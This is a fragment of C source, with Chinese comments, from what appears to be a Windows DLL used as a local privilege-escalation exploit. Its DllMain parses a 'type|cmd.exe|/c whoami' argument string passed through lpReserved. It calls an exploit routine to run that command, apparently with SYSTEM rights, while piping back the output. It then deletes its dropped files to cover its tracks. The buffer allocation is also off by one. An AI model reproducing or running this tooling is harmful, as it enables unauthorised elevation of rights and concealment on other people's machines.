		if (CurrentUserIsLocalSystem()) {
			printf("[-] You are already in system.\n");
		}
		else {
			//1.动态分配内存，不能直接 char* dest = (char*)lpReserved;,因为操作的是同一块内存地址，这样一来分割dest时也改变了 (char*)lpReserved
			int len = strlen((char*)lpReserved);
			char* dest = (char*)malloc(sizeof(char) * len);
			if (dest != NULL) {
				strcpy_s(dest, len+1, (char*)lpReserved);
			}
			printf("[*] Get %s\n", dest);
			const char s[2] = "|";   //分隔符
			char* next_token = NULL; //缓冲区
			char* parameters = NULL; 
			char* program = NULL;
			char* init = NULL;
			init = strtok_s(dest, s, &next_token);     // 执行的方式
			if (init == NULL) {
				printf("[-] 参数格式 \"type|cmd.exe|/c whoami\"\n");
				fflush(stdout);
				ExitProcess(0);
				break;
			}
			program = strtok_s(NULL, s, &next_token);    // 执行的程序
			if(program == NULL ) {	
				printf("[-] 参数格式 \"type|cmd.exe|/c whoami\"\n");
				fflush(stdout);
				ExitProcess(0);
				break;
			}
			parameters = strtok_s(NULL, s, &next_token);  // 参数
			if (parameters == NULL) {
				printf("[-] 参数格式 \"type|cmd.exe|/c whoami\"\n");
				fflush(stdout);
				ExitProcess(0);
				break;
			}

			///
			/// 参数处理完成 开始Exp
			/// 
			//创建一个线程去等待PIPE
			if (atoi(init) == 1) {
				threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Pipestdout, hinstDLL, 0, NULL);
				Sleep(100);
				exploit(c2w(program), c2w(parameters));
				if (threadHandle) {
					DWORD signWait = WaitForSingleObject(threadHandle, 20000);
					if (WAIT_FAILED == signWait) {
						printf("[-] WaitForSingleObject WAIT_FAILED Failed.\n");
					}
					if (WAIT_TIMEOUT == signWait) {
						printf("[-] WaitForSingleObject TIMEOUT.\n");
					}
					CloseHandle(threadHandle);
				}
			}
			else {
				Sleep(100);
				exploit(c2w(program), c2w(parameters));
			}
			DirectoryListCleanUp_After(GetExeDir(), GetExe()); //删除释放的文件
		}
		printf("[+] Jobs Done.\n");
		fflush(stdout);
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}